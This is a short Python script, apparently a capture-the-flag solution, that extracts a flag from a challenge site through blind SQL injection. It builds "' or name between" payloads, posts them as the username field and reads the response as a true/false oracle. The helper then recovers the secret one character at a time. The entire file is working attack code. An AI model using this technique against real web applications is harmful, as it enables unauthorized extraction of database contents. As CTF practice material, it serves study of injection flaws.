import string
import requests

from utils.ctf.blind_sqli import *

def oracle(s):
	s="lactf"+s
	upper = chr(ord(s[-1]) + 1)
	if s[-1] == "9":
		upper = "a"
	
	payload = f"' or name between '{s}' and '{s[:-1]+upper}"
	print(payload)
	resp = requests.post("https://penguin.chall.lac.tf/submit", data={"username": payload}).text
	print(resp)
	return "We found" in resp

blind_sqli("{}", oracle, chars=string.digits+string.ascii_letters + "_")
